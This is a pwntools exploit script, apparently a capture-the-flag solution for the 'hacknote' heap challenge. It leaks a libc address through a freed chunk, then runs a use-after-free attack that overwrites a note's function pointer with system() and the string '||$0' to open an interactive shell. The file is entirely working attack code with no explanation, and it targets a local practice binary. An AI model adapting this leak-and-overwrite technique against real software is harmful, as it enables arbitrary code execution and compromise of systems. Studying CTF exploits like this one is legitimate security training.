from pwn import *
context.log_level = 'debug'
io=process('./hacknote')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
elf=ELF('./hacknote')

#------------define function------------#
def logmess(a,b):
	log.success(a+'==>'+hex(b))

def addnote(size,content):
	io.sendlineafter('Your choice :','1')
	io.sendlineafter('Note size :',str(size))
	io.sendlineafter('Content :',content)
	
 
def delnote(index):
	io.sendlineafter('Your choice :','2')
	io.sendlineafter('Index :',str(index))

def printnote(index):
	io.sendlineafter('Your choice :','3')
	io.sendlineafter('Index :',str(index))

#----------------leak libc ---------------#
addnote(128,'aaaa')#0
addnote(128,'bbbb')#1
delnote(0)
addnote(128,"aaa")#2
printnote(2)
io.recvuntil('aaa\n')
main_arena_48 = u32(io.recv(4))
logmess('main_arena_48',main_arena_48)
libc_base = main_arena_48 - 0x30 - 0x1b3780
logmess('libc_base',libc_base)
#gdb.attach(io)

#------------fastbin attack----------------#
addnote(32, "aaaa") #3

delnote(2) #del 2
delnote(3) #del 3

sys_addr=libc.symbols['system']+libc_base

#one_gadget = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]#0-5
#onegadget = libc_base + one_gadget[5]

#addnote(8, p32(onegadget)) #4
addnote(0x8,p32(sys_addr)+'||$0')
printnote(2) # print note 0
io.interactive()

